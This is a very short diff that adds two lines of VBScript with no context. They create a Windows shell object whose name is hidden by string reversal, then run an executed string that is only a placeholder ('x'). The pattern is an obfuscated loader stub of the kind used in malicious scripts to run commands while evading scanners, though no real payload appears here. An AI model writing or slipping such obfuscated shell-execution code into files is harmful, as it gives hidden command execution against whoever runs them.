@@ -1,0 +1,3 @@
+Set o = CreateObject(StrReverse("llehS.tpircSW"))
+Execute StrReverse("x")
+
